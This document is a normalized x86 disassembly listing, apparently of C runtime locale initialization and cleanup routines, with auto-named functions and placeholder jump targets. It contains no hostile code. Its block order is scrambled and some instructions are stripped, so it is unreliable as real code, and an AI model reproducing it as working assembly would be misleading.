call sub_40c283
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_40c283
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_40c283
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_40c283
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_40c283
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_40f189
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_408a41
push [ esi + 0x8 ]
call sub_408a41
push [ esi + 0xc ]
call sub_408a41
push [ esi + 0x10 ]
call sub_408a41
push [ esi + 0x14 ]
call sub_408a41
push [ esi + 0x18 ]
call sub_408a41
push [ esi ]
call sub_408a41
push [ esi + 0x20 ]
call sub_408a41
push [ esi + 0x24 ]
call sub_408a41
push [ esi + 0x28 ]
call sub_408a41
push [ esi + 0x2c ]
call sub_408a41
push [ esi + 0x30 ]
call sub_408a41
push [ esi + 0x34 ]
call sub_408a41
push [ esi + 0x1c ]
call sub_408a41
push [ esi + 0x38 ]
call sub_408a41
push [ esi + 0x3c ]
call sub_408a41
add esp 0x40
push [ esi + 0x40 ]
call sub_408a41
push [ esi + 0x44 ]
call sub_408a41
push [ esi + 0x48 ]
call sub_408a41
push [ esi + 0x4c ]
call sub_408a41
push [ esi + 0x50 ]
call sub_408a41
push [ esi + 0x54 ]
call sub_408a41
push [ esi + 0x58 ]
call sub_408a41
push [ esi + 0x5c ]
call sub_408a41
push [ esi + 0x60 ]
call sub_408a41
push [ esi + 0x64 ]
call sub_408a41
push [ esi + 0x68 ]
call sub_408a41
push [ esi + 0x6c ]
call sub_408a41
push [ esi + 0x70 ]
call sub_408a41
push [ esi + 0x74 ]
call sub_408a41
push [ esi + 0x78 ]
call sub_408a41
push [ esi + 0x7c ]
call sub_408a41
add esp 0x40
push [ esi + 0x80 ]
call sub_408a41
push [ esi + 0x84 ]
call sub_408a41
push [ esi + 0x88 ]
call sub_408a41
push [ esi + 0x8c ]
call sub_408a41
push [ esi + 0x90 ]
call sub_408a41
push [ esi + 0x94 ]
call sub_408a41
push [ esi + 0x98 ]
call sub_408a41
push [ esi + 0x9c ]
call sub_408a41
push [ esi + 0xa0 ]
call sub_408a41
push [ esi + 0xa4 ]
call sub_408a41
push [ esi + 0xa8 ]
call sub_408a41
push [ esi + 0xbc ]
call sub_408a41
push [ esi + 0xc0 ]
call sub_408a41
push [ esi + 0xc4 ]
call sub_408a41
push [ esi + 0xc8 ]
call sub_408a41
push [ esi + 0xcc ]
call sub_408a41
add esp 0x40
push [ esi + 0xd0 ]
call sub_408a41
push [ esi + 0xb8 ]
call sub_408a41
push [ esi + 0xd8 ]
call sub_408a41
push [ esi + 0xdc ]
call sub_408a41
push [ esi + 0xe0 ]
call sub_408a41
push [ esi + 0xe4 ]
call sub_408a41
push [ esi + 0xe8 ]
call sub_408a41
push [ esi + 0xec ]
call sub_408a41
push [ esi + 0xd4 ]
call sub_408a41
push [ esi + 0xf0 ]
call sub_408a41
push [ esi + 0xf4 ]
call sub_408a41
push [ esi + 0xf8 ]
call sub_408a41
push [ esi + 0xfc ]
call sub_408a41
push [ esi + 0x100 ]
call sub_408a41
push [ esi + 0x104 ]
call sub_408a41
push [ esi + 0x108 ]
call sub_408a41
add esp 0x40
push [ esi + 0x10c ]
call sub_408a41
push [ esi + 0x110 ]
call sub_408a41
push [ esi + 0x114 ]
call sub_408a41
push [ esi + 0x118 ]
call sub_408a41
push [ esi + 0x11c ]
call sub_408a41
push [ esi + 0x120 ]
call sub_408a41
push [ esi + 0x124 ]
call sub_408a41
push [ esi + 0x128 ]
call sub_408a41
push [ esi + 0x12c ]
call sub_408a41
push [ esi + 0x130 ]
call sub_408a41
push [ esi + 0x134 ]
call sub_408a41
push [ esi + 0x138 ]
call sub_408a41
push [ esi + 0x13c ]
call sub_408a41
push [ esi + 0x140 ]
call sub_408a41
push [ esi + 0x144 ]
call sub_408a41
push [ esi + 0x148 ]
call sub_408a41
add esp 0x40
push [ esi + 0x14c ]
call sub_408a41
push [ esi + 0x150 ]
call sub_408a41
push [ esi + 0x154 ]
call sub_408a41
push [ esi + 0x158 ]
call sub_408a41
push [ esi + 0x15c ]
call sub_408a41
push [ esi + 0x160 ]
call sub_408a41
add esp 0x18
sub_40f500
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_409f5e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_40e98a
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_40f189
push edi
call sub_408a41
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_40f57d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
push esi
call sub_408a41
pop ecx
sub_40f5e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_409f5e
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_409f19
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_408a41
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_409f19
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_40f57d
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_408a41
push [ esi + 0xbc ]
call sub_408a41
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_408a41
push [ ebp - 0x8 ]
call sub_408a41
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_40f7d6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_408a41
pop ecx
push esi
call sub_408a41
pop ecx
sub_40f8d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_409f5e
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_409f19
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_408a41
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_409f19
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_40c283
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_408a41
push [ ebp - 0x8 ]
call sub_408a41
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_40f7d6
push ebx
call sub_408a41
push [ ebp - 0x8 ]
call sub_408a41
push [ ebp - 0x4 ]
call sub_408a41
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_408a41
push [ esi + 0xb0 ]
call sub_408a41
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_40fc34
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_40c61a
